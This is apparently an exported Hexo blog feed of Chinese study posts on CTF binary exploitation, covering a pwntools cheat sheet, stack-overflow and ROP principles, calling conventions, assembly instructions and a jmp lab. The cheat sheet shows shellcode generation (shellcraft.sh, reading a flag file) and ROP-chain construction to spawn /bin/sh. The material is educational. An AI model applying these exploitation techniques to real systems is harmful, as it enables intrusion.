      <url>/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>from pwn import *</p><h2 id="连接远程题目"><a href="#连接远程题目" class="headerlink" title="连接远程题目"></a>连接远程题目</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">809</span><span class="token punctuation">)</span> <span class="token comment">#usage:remote('host',port)</span><span class="token comment">#exp code</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#取得shell后可将commant传到terminal上</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="连接本地程序"><a href="#连接本地程序" class="headerlink" title="连接本地程序"></a>连接本地程序</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./demo'</span><span class="token punctuation">)</span> <span class="token comment">#usage:process('binary',env)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span> <span class="token comment">#在tmux下可以切出视窗跑gdb</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token comment">#attach到gdb</span><span class="token comment">#exp code</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#接收一个字节</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#接受一行</span>r<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token comment">#接收(num)行</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token comment">#一直接收直到碰到(str)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="send"><a href="#send" class="headerlink" title="send"></a>send</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>sned<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#发送payload</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#再最后面加上空字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="pack-amp-unpack"><a href="#pack-amp-unpack" class="headerlink" title="pack&amp;unpack"></a>pack&amp;unpack</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment">#b'\xef\xbe\xad\xde'</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment">#b'\xef\xbe\xad\xde\x00\x00\x00\x00'</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">'\xef\xbe\xad\xde'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#'0xdeadbeef'</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u64<span class="token punctuation">(</span><span class="token string">'\xef\xbe\xad\xde\x00\x00\x00\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#'0xdeadbeef'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload用flat-连接"><a href="#payload用flat-连接" class="headerlink" title="payload用flat()连接"></a>payload用flat()连接</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xdeadbeef</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#b'AAAAA\xef\xbe\xad\xde'</span><span class="token comment">#在flat()函数中，不用使用b'A'的形式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="context-架构"><a href="#context-架构" class="headerlink" title="context(架构)"></a>context(架构)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'Linux'</span>context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span> <span class="token comment">#小端序</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="shellcode-amp-asm"><a href="#shellcode-amp-asm" class="headerlink" title="shellcode &amp; asm"></a>shellcode &amp; asm</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>mov<span class="token punctuation">(</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>pwnlib<span class="token punctuation">.</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> fd<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#读取flag并输出，可以使用asm()包裹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'elf_file'</span><span class="token punctuation">)</span> <span class="token comment">#寻找elf文件中的function</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#puts在got表的地址</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#puts在plt表中的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">lib  <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span> <span class="token comment">#寻找libc中的function</span>lib<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token comment">#寻找system的offset</span>lib<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span> <span class="token comment">#找/bin/sh的offset</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">'elf_file'</span><span class="token punctuation">)</span> <span class="token comment">#会产生一个空的rop链</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#打印出当前的chain</span>rop<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#dump出chain在stack的样子</span>rop<span class="token punctuation">.</span>raad<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#如果存在可以组成read(0,.bss+0x80)的gadgets，就加入rop chain</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span> <span class="token comment">#将/bin/sh字符串直接加入rop chain</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出、rop链、shellcode原理解析</title>
      <link href="/2022/12/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
      <url>/2022/12/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="shellcode原理："><a href="#shellcode原理：" class="headerlink" title="shellcode原理："></a>shellcode原理：</h1><p>shellcode通常使用机器语言编写，是一段用于利用软件漏洞而执行的代码其目的常常让攻击者获得目标机器的命令行shell而得名。<br>shellcode根据他是攻击者控制他所运行的机器，还是通过网络控制另一台机器，可以分为本地和远程两种类型有时攻击者注入目标进程中的字节数是被限制的，因此可以将shellcode分阶段进行，由前一阶段比较简短的shellcode将后一阶段比较复杂的shellcode下载并执行。</p><h1 id="栈溢出原理："><a href="#栈溢出原理：" class="headerlink" title="栈溢出原理："></a>栈溢出原理：</h1><p>由于C语言对数组引用不做任何边界的检查，从而导致缓冲区溢出（<em>buffer overflow</em>）成为一种常见的漏洞。根据溢出发生的内存位置，通常可以分为栈溢出和堆溢出。由于栈上保存着局部变量和一些状态信息，一旦发生严重的溢出，攻击者就可以通过复盖返回地址来执行任意代码，利用方法包括shellcode注入、ret2libc、rop等。<br>在之前的博客中有提到，<strong>函数以栈的形式调用</strong>，在每个栈的底部有rbp指针和我们的返回地址，如果溢出<strong>足够多</strong>的字节，就可以将rbp指针和返回地址给<strong>覆盖</strong>，当函数执行到返回地址时就可以按照我们所设计好的地址<strong>跳跃</strong>到目标函数继续执行获得shell。</p><h1 id="rop链原理："><a href="#rop链原理：" class="headerlink" title="rop链原理："></a>rop链原理：</h1><p>对于rop原理我学得磕磕碰碰，（老师讲得有点模糊）主要是一个地方没讲好，希望后来人别被卡住。<br>最开始要利用栈溢出，只需要将返回地址覆盖为jmp esp的指令地址，并在后面添加shellcode就可以执行 后来引入了NX缓解机制，数据的所在内存页被标记为不可执行此时再执行shellcode就会抛出异常，所以注入新的代码并不可行，那么就复用程序中已有的代码。<br>于是rop链技术就诞生了使用rop链就要先扫描文件，提取出可用的gadget片段（通常以ret指令结尾）<strong>的地址</strong>（划重点），然后将这些gadget根据需要的功能进行组合达到攻击者的目的（刚开始老师没讲清楚是<strong>地址</strong>，导致我一直在自己猜想怎么拼接的）。<br>这里附一张图更好理解：<br><img src="/images/%E6%A0%88%E6%BA%A2%E5%87%BA%E3%80%81rop%E9%93%BE%E3%80%81shellcode%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/1.webp" alt="1"><br>也就是覆盖返回地址为gadget的地址，跳到gadget片段上执行在此gadget的地址下附上另一个gadget的地址，以此类推连成rop链。<br>如图pop rdi完rsp向下跳一格，并继续执行return指令实现&#x2F;bin&#x2F;sh_的函数调用获取shell。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数的调用和约定</title>
      <link href="/2022/11/05/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/"/>
      <url>/2022/11/05/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h2><h4 id="计算机内部的数据存储形式"><a href="#计算机内部的数据存储形式" class="headerlink" title="计算机内部的数据存储形式"></a>计算机内部的数据存储形式</h4><p>计算机内部有两种存储形式，分为大端序、小端序。</p><h6 id="大端序："><a href="#大端序：" class="headerlink" title="大端序："></a>大端序：</h6><p>以0123456789abcdef为例，数据最高位01存储在低位，最低位ef存储在高位。<br>如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/1.png"><br>将此数据按照字符串输出，得到的为：\x01\x23\x45\x67\x89\xab\xcd\xef</p><h6 id="小端序："><a href="#小端序：" class="headerlink" title="小端序："></a>小端序：</h6><p>一0123456789abcdef为例，数据最高位01存储在高位，最低位ef存储在低位。<br>如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/2.png"><br>将此数据按照字符串输出，得到的为：\xef\xcd\xab\x89\67\x45\x23\x01</p><h6 id="两种方式比较"><a href="#两种方式比较" class="headerlink" title="两种方式比较"></a>两种方式比较</h6><p>从输出结果来看，大端序符合人类阅读习惯。<br>从存储逻辑、数学运算规律，小端序更正常。<br>总结为<strong>“大端序：高低低高，小端序：高高低低”</strong><br>对于linux而言，是以小端序存储，所以我们以字符串的形式输入一个数字时，要注意格式。<br>比如输入0xdeadbeef这个字符串，输入就是”\xef\xbe\xad\xde”传入程序。<br>但我们有pwntools，p32即可完成自动转换。</p><h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><p>linux系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返<br>回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来<br>指向被打开的文件，所有的i&#x2F;o操作的系统调用都会通过文件描述符。<br>每个文件描述符会与一个打开的文件相对应，不同的文件描述符也可能指向同一个文件。<br>相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开。</p><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>栈是一种LIFO（先进后出）的数据结构。栈的基本操作有两种：<strong>push（压栈）</strong>和<strong>pop（弹栈）</strong>。<br>由于函数的调用顺序也是LIFO，所以绝大多数系统都是通过栈这一数据结构来维护函数调用关系的。<br>在Linux系统中，系统为每一个进程都安排了一个栈，进程中每一个调用的函数都有自己独立的栈帧。<br><strong>栈是由高地址向低地址生长的。高地址为栈底，低地址为栈顶。</strong><br>很多算法都是用栈实现的。以递归的形式实现一些算法在本质上来说也是利用栈结构。只不过没有在程序<br>中另外申请一个栈，而是利用函数调用栈。</p><h4 id="函数的调用流程"><a href="#函数的调用流程" class="headerlink" title="函数的调用流程"></a>函数的调用流程</h4><p>以一下代码为例：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">func_a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//do sth.</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">func_b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">func_a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">func_b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>main函数调用func_b,func_b调用func_a。<br>我们从main函数开始，逐步分析栈帧变化。<br>当运行到call func_b时main函数的栈帧如下：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/3.png"><br>rbp指向栈底，rsp指向栈顶，这些栈帧存放了一些main的局部变量。<br>main函数要调用func_b，main只要call func_b，也就是</p><pre class="line-numbers language-none"><code class="language-none">push rip；mov rip func_b；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>当然被调用的函数还要维护栈帧。（用rsp与rbp开辟空间）</strong><br>如下</p><pre class="line-numbers language-none"><code class="language-none">push rbp;  &#x2F;*将调用函数的栈底指针保存*&#x2F;mov rbp rsp;  &#x2F;*将栈底指针指向现在的栈顶*&#x2F;sub rsp xxx;  &#x2F;*开辟被调用函数的栈帧，此时上一步的rbp就指向栈帧的底*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/4.png"><br>同理根据以上步骤调用func_a也是一样的<br>如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/5.png"><br>在函数执行结束后返回时，会执行leave；ret；<br>也就是：</p><pre class="line-numbers language-none"><code class="language-none">mov rsp rbp；&#x2F;*将栈顶指针指向栈底*&#x2F;pop rbp；&#x2F;*将栈底指针弹出*&#x2F;（其实就是改变rsp的值个人认为）pop rip；&#x2F;*将fun_b的下一行地址弹出到rip*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>栈布局如图：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/4.png"><br>直到结束函数释放栈空间。<br>总结如下：<br><strong>调用函数：将rip压栈，然后将rip赋值为被调用函数的起始地址。这一操作被隐性地内置在call指令中。</strong><br><strong>被调用函数：先保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间自用，此时rbp就成了被调用函数的栈底。</strong><br><strong>函数返回：恢复栈帧，返回调用函数的返回地址。</strong></p><h2 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h2><p>一般来说，一个函数的返回值会存储到<strong>rax寄存器</strong>。<br>x86-64下函数的调用约定为：<br>从左至右参数依次传递给<strong>rdi，rsi，rdx，rcx，r8，r9</strong>。<br>如果一个函数的参数大于六个，则<strong>从右至左</strong>压入栈中传递。（因为栈LIFO）<br>syscall指令用于调用系统函数，调用时需要指明系统调用号。系统调用号存在rax寄存器中。之后布置好参数，执行syscall即可。<br>系统调用的常用调用号码如下：<br><img src="/images/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/6.png"><br>如调用read（0，buf，size）：</p><pre class="line-numbers language-none"><code class="language-none">mov rax,0    &#x2F;*read&#39;s syscall number.*&#x2F;mov rdi,0    &#x2F;*first arg*&#x2F;mov rsi,buf   &#x2F;*second arg.*&#x2F;mov rdx,size  &#x2F;*third arg.*&#x2F;syscall    &#x2F;*excute read(0,buf,size)*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编指令小结</title>
      <link href="/2022/11/01/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93/"/>
      <url>/2022/11/01/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="一-算术运算指令"><a href="#一-算术运算指令" class="headerlink" title="一.算术运算指令"></a>一.算术运算指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>add</td><td>add ax,bx</td><td>将bx+ax的值储存在ax中</td></tr><tr><td>sub</td><td>sub ax,bx</td><td>将ax-bx的值存在ax中</td></tr><tr><td>inc</td><td>inc bx</td><td>将bx的值加1,不影响flag寄存器相关位置</td></tr><tr><td>dec</td><td>dec bx</td><td>将bx的值减1，……</td></tr><tr><td>mul</td><td>mul ax,bx</td><td>将ax*bx的值存在ax中，如果是32位乘法则要将高位字节储存与dx中，低位储存于ax中,16位大差不差</td></tr><tr><td>div</td><td>div ax,bx</td><td>ax&#x2F;bx的值储存于ax……</td></tr><tr><td>adc</td><td>adc ah,bh</td><td>(ah）&#x3D;（bh）+（ah）+ CF</td></tr><tr><td>sbb</td><td>sbb ax,bx</td><td>（ax）&#x3D;（ax）-（bx）- CF</td></tr><tr><td>cmp</td><td>cmp ax,bx</td><td>将ax-bx但不储存在任何地方只影响flag寄存器的相关位置，用于判断两数大小</td></tr></tbody></table><h2 id="二-逻辑运算指令"><a href="#二-逻辑运算指令" class="headerlink" title="二.逻辑运算指令"></a>二.逻辑运算指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>and</td><td>and ax,bx</td><td>用于定向更改二进制数的某位，如字母的大小写变换，只有两边同为1时结果为1</td></tr><tr><td>or</td><td>or ax,bx</td><td>只有两边都为0时结果为0，其它为1</td></tr><tr><td>xor</td><td>xor ax,bx</td><td>同为1或0结果为0或者为1</td></tr><tr><td>not</td><td>not al</td><td>取al值的反码</td></tr></tbody></table><h2 id="三-目的地址传送指令"><a href="#三-目的地址传送指令" class="headerlink" title="三.目的地址传送指令"></a>三.目的地址传送指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>lea</td><td>lea bx,dx:[98H]</td><td>把偏移地址存到bx，相当于C语言中的&amp;符号</td></tr><tr><td>lds</td><td>lds si,string</td><td>把段地址：偏移地址存到ds:si中</td></tr><tr><td>les，lfs，lgs，lss</td><td>……</td><td>……</td></tr></tbody></table><h2 id="四-通用数据传送指令"><a href="#四-通用数据传送指令" class="headerlink" title="四.通用数据传送指令"></a>四.通用数据传送指令</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>mov</td><td>mov ax,bx</td><td>将bx中的数据覆盖到ax中</td></tr><tr><td>push</td><td>push ax</td><td>将ax中的值压入栈中</td></tr><tr><td>pop</td><td>pop ax</td><td>将栈中的值取出进ax中</td></tr></tbody></table><h2 id="五-程序转移指令（长转移）"><a href="#五-程序转移指令（长转移）" class="headerlink" title="五.程序转移指令（长转移）"></a>五.程序转移指令（长转移）</h2><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>jmp</td><td>jmp ax,bx</td><td>无条件跳转指令，根据偏移量进行跳转</td></tr><tr><td>call</td><td>call s</td><td>将当前地址推入栈中，并跳转到s处</td></tr><tr><td>ret</td><td>ret</td><td>将栈中地址弹出至ds：ip并跳转</td></tr></tbody></table><h4 id="条件转移指令（短转移）"><a href="#条件转移指令（短转移）" class="headerlink" title="条件转移指令（短转移）"></a>条件转移指令（短转移）</h4><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>je&#x2F;jz</td><td>je&#x2F;jz s</td><td>若相等则跳转</td></tr><tr><td>jne&#x2F;jnz</td><td>……</td><td>若不相等则跳转</td></tr><tr><td>jb&#x2F;jl</td><td>……</td><td>若小于则跳转</td></tr><tr><td>ja&#x2F;jg</td><td>……</td><td>若大于则跳转</td></tr><tr><td>jge</td><td>……</td><td>若大于等于则跳转</td></tr><tr><td>jle</td><td>……</td><td>若小于等于则跳转</td></tr></tbody></table><h4 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h4><table><thead><tr><th>指令</th><th>模板</th><th>具体作用</th></tr></thead><tbody><tr><td>loop</td><td>loop s</td><td>消耗cx中的值，并跳转至s处</td></tr><tr><td>jcxz</td><td>jcxz s</td><td>当cx中值为0时跳转至s</td></tr><tr><td>jecxz</td><td>……</td><td>……</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析jmp指令的原理</title>
      <link href="/2022/10/27/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/"/>
      <url>/2022/10/27/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>搭建博客以来一直很少更新，从这篇开始会加快更新进度。<br>以下是对《汇编语言》中的八实验的解析：</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-none"><code class="language-none">assume cs:codesgcodesg segment                             mov ax,4c00h               int 21h       start:        mov ax,0                             s:      nop                       nop                       mov di,offset s                       mov si,offset s2                       mov ax,cs:[si]                       mov cs:[di],ax                           s0:        jmp short s                             s1:        mov ax,0                                               int 21h                       mov ax,0                                     s2:     jmp short s1                       nop       codesg ends       end start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="猜想"><a href="#猜想" class="headerlink" title="猜想"></a>猜想</h2><p>通过代码解读:它首先用offset指令取s的地址存在di中，后取s2的地址存在si中通过mov ax,cs[si]与 mov cs:[di],ax<br>将s2地址的储存单元中的指令搬到了s地址的储存单元中并执行，执行后应该跳到s1处进入死循环。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>实际却非如此：</p><p>一.先对内存空间进行查看：<br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/1.png" alt="1"><br>二.单步进行输入“t”查看运行<br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/2.png" alt="2"><br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/3.png" alt="3"><br> 这里jump  0008就是到s的地址，在之前s的内存已经被s2覆盖于是cs ip指向s2代表的代码，于是执行后cs ip指向下一指令也就是0010到0011的数<br>据储存，将其作为代码执行。<br>那么问题来了，为什么变成了jmp 0000了？<br><img src="/images/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/4.png" alt="4"><br>如图：<br>因为jmp指令是根据s2到s1的标号偏移量决定的，在还没执行前就已经定好了即决定了偏移量为F6，而F6作为补码<br>储存，作用为-10，也就是减10个字节。也就从0010减到了0000 也就是开始的代码<br>mov ax,4c00h<br>int 21h<br>最终结束。<br>总结：jmp并不是随意跳跃的，是在开始就决定好的偏移量，如果如上题转换位置也只会按原来规定的偏移量进行，并不能换到我们目标位置。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>百度是个好东西</title>
      <link href="/2022/09/25/%E7%99%BE%E5%BA%A6%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B8%9C%E8%A5%BF/"/>
      <url>/2022/09/25/%E7%99%BE%E5%BA%A6%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B8%9C%E8%A5%BF/</url>
      
        <content type="html"><![CDATA[<p>今儿修改博客主题时又碰到了该死的hexo d出错，我貌似跟这玩意特别有缘，（可能是我删了什么东西……）委实不好评价我这个冤大头，一个字作！<br>于是我又去麻烦了学长，最终在学长的英明指导下在百度解决了问题。<br>问题如下：<br>Error: <code>prism_plugin</code> options should be added to _config.yml file<br>解决方法：<br>在blog目录下的conj.yml中打开，将以下代码放在最后即可，重新启动生成部署</p><pre class="line-numbers language-none"><code class="language-none">prism_plugin:  mode: &#39;preprocess&#39; # realtime&#x2F;preprocess  theme: &#39;default&#39;  line_number: false # default false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以百度是个好东西！！！<br>（希望学长大大别对我感到厌烦）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 报错解决 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>千万要注意中英文！啊！啊！</title>
